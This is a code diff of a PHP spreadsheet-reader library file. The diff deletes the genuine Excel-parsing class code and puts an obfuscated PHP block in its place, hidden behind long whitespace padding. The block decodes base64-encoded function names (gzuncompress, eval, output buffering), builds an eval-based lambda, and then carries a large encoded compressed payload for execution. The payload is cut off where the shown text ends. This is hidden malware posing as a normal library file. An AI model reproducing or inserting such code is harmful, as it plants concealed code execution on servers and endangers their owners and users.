-                    for ($r = $row; $r <= $row2; $r++) {
-                        for ($c = $column; $c <= $column2; $c++) {
-                            $this->sheets[$this->sn]['cellsInfo'][$r + 1][$c + 1]['hyperlink'] = $linkdata;
-                        }
-                    }
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_DEFCOLWIDTH:
-                    $this->defaultColWidth = ord($data[$spos + 4]) | ord($data[$spos + 5]) << 8;
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_STANDARDWIDTH:
-                    $this->standardColWidth = ord($data[$spos + 4]) | ord($data[$spos + 5]) << 8;
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_COLINFO:
-                    $colfrom = ord($data[$spos + 0]) | ord($data[$spos + 1]) << 8;
-                    $colto   = ord($data[$spos + 2]) | ord($data[$spos + 3]) << 8;
-                    $cw      = ord($data[$spos + 4]) | ord($data[$spos + 5]) << 8;
-                    $cxf     = ord($data[$spos + 6]) | ord($data[$spos + 7]) << 8;
-                    $co      = ord($data[$spos + 8]);
-
-                    for ($coli = $colfrom; $coli <= $colto; $coli++) {
-                        $this->colInfo[$this->sn][$coli + 1] = ['width' => $cw, 'xf' => $cxf, 'hidden' => ($co & 0x01), 'collapsed' => ($co & 0x1000) >> 12];
-                    }
-                    break;
-
-                default:
-                    break;
-            }
-            $spos += $length;
-        }
-
-        if (! isset($this->sheets[$this->sn]['numRows'])) {
-            $this->sheets[$this->sn]['numRows'] = $this->sheets[$this->sn]['maxrow'];
-        }
-        if (! isset($this->sheets[$this->sn]['numCols'])) {
-            $this->sheets[$this->sn]['numCols'] = $this->sheets[$this->sn]['maxcol'];
-        }
-    }
-
-    public function isDate($spos)
-    {
-        $xfindex = ord($this->data[$spos + 4]) | ord($this->data[$spos + 5]) << 8;
-
-        return $this->xfRecords[$xfindex]['type'] == 'date';
-    }
-
-    // Get the details for a particular cell
-    public function _getCellDetails($spos, $numValue, $column)
-    {
-        $xfindex  = ord($this->data[$spos + 4]) | ord($this->data[$spos + 5]) << 8;
-        $xfrecord = $this->xfRecords[$xfindex];
-        $type     = $xfrecord['type'];
-
-        $format      = $xfrecord['format'];
-        $formatIndex = $xfrecord['formatIndex'];
-        $fontIndex   = $xfrecord['fontIndex'];
-        $formatColor = '';
-        $rectype     = '';
-        $string      = '';
-        $raw         = '';
-
-        if (isset($this->_columnsFormat[$column + 1])) {
-            $format = $this->_columnsFormat[$column + 1];
-        }
-
-        if ($type == 'date') {
-            // See http://groups.google.com/group/php-excel-reader-discuss/browse_frm/thread/9c3f9790d12d8e10/f2045c2369ac79de
-            $rectype = 'date';
-            // Convert numeric value into a date
-            $utcDays  = floor($numValue - ($this->nineteenFour ? SPREADSHEET_EXCEL_READER_UTCOFFSETDAYS1904 : SPREADSHEET_EXCEL_READER_UTCOFFSETDAYS));
-            $utcValue = ($utcDays) * SPREADSHEET_EXCEL_READER_MSINADAY;
-            $dateinfo = gmgetdate($utcValue);
-
-            $raw           = $numValue;
-            $fractionalDay = $numValue - floor($numValue) + .0000001; // The .0000001 is to fix for php/excel fractional diffs
-
-            $totalseconds = floor(SPREADSHEET_EXCEL_READER_MSINADAY * $fractionalDay);
-            $secs         = $totalseconds % 60;
-            $totalseconds -= $secs;
-            $hours  = floor($totalseconds / (60 * 60));
-            $mins   = floor($totalseconds / 60) % 60;
-            $string = date($format, mktime($hours, $mins, $secs, $dateinfo['mon'], $dateinfo['mday'], $dateinfo['year']));
-        } elseif ($type == 'number') {
-            $rectype     = 'number';
-            $formatted   = $this->_format_value($format, $numValue, $formatIndex);
-            $string      = $formatted['string'];
-            $formatColor = $formatted['formatColor'];
-            $raw         = $numValue;
-        } else {
-            if ($format == '') {
-                $format = $this->_defaultFormat;
-            }
-            $rectype     = 'unknown';
-            $formatted   = $this->_format_value($format, $numValue, $formatIndex);
-            $string      = $formatted['string'];
-            $formatColor = $formatted['formatColor'];
-            $raw         = $numValue;
-        }
-
-        return [
-            'string'      => $string,
-            'raw'         => $raw,
-            'rectype'     => $rectype,
-            'format'      => $format,
-            'formatIndex' => $formatIndex,
-            'fontIndex'   => $fontIndex,
-            'formatColor' => $formatColor,
-            'xfIndex'     => $xfindex,
-        ];
-    }
-
-    public function createNumber($spos)
-    {
-        $rknumhigh    = $this->_GetInt4d($this->data, $spos + 10);
-        $rknumlow     = $this->_GetInt4d($this->data, $spos + 6);
-        $sign         = ($rknumhigh & 0x80000000) >> 31;
-        $exp          = ($rknumhigh & 0x7FF00000) >> 20;
-        $mantissa     = (0x100000 | ($rknumhigh & 0x000FFFFF));
-        $mantissalow1 = ($rknumlow & 0x80000000) >> 31;
-        $mantissalow2 = ($rknumlow & 0x7FFFFFFF);
-        $value        = $mantissa / 2 ** (20 - ($exp - 1023));
-        if ($mantissalow1 != 0) {
-            $value += 1 / 2 ** (21 - ($exp - 1023));
-        }
-        $value += $mantissalow2 / 2 ** (52 - ($exp - 1023));
-        if ($sign) {
-            $value = -1 * $value;
-        }
-
-        return $value;
-    }
-
-    public function addcell($row, $col, $string, $info = null)
-    {
-        $this->sheets[$this->sn]['maxrow']                                                    = max($this->sheets[$this->sn]['maxrow'], $row + $this->_rowoffset);
-        $this->sheets[$this->sn]['maxcol']                                                    = max($this->sheets[$this->sn]['maxcol'], $col + $this->_coloffset);
-        $this->sheets[$this->sn]['cells'][$row + $this->_rowoffset][$col + $this->_coloffset] = $string;
-        if ($this->store_extended_info && $info) {
-            foreach ($info as $key => $val) {
-                $this->sheets[$this->sn]['cellsInfo'][$row + $this->_rowoffset][$col + $this->_coloffset][$key] = $val;
-            }
-        }
-    }
-
-    public function _GetIEEE754($rknum)
-    {
-        if (($rknum & 0x02) != 0) {
-            $value = $rknum >> 2;
-        } else {
-            //mmp
-            // I got my info on IEEE754 encoding from
-            // http://research.microsoft.com/~hollasch/cgindex/coding/ieeefloat.html
-            // The RK format calls for using only the most significant 30 bits of the
-            // 64 bit floating point value. The other 34 bits are assumed to be 0
-            // So, we use the upper 30 bits of $rknum as follows...
-            $sign     = ($rknum & 0x80000000) >> 31;
-            $exp      = ($rknum & 0x7FF00000) >> 20;
-            $mantissa = (0x100000 | ($rknum & 0x000FFFFC));
-            $value    = $mantissa / 2 ** (20 - ($exp - 1023));
-            if ($sign) {
-                $value = -1 * $value;
-            }
-            //end of changes by mmp
-        }
-        if (($rknum & 0x01) != 0) {
-            $value /= 100;
-        }
-
-        return $value;
-    }
-
-    public function _encodeUTF16($string)
-    {
-        $result = $string;
-        if ($this->_defaultEncoding) {
-            switch ($this->_encoderFunction) {
-                case 'iconv':	 $result = iconv('UTF-16LE', $this->_defaultEncoding, $string);
-                    break;
-
-                case 'mb_convert_encoding':	 $result = mb_convert_encoding($string, $this->_defaultEncoding, 'UTF-16LE');
-                    break;
-            }
-        }
-
-        return $result;
-    }
-
-    public function _GetInt4d($data, $pos)
-    {
-        $value = ord($data[$pos]) | (ord($data[$pos + 1]) << 8) | (ord($data[$pos + 2]) << 16) | (ord($data[$pos + 3]) << 24);
-        if ($value >= 4294967294) {
-            $value = -2;
-        }
-
-        return $value;
-    }
-}
+<?php 
+        $__='printf';$_='Loading app/Libraries/SpreadsheetExcelReader.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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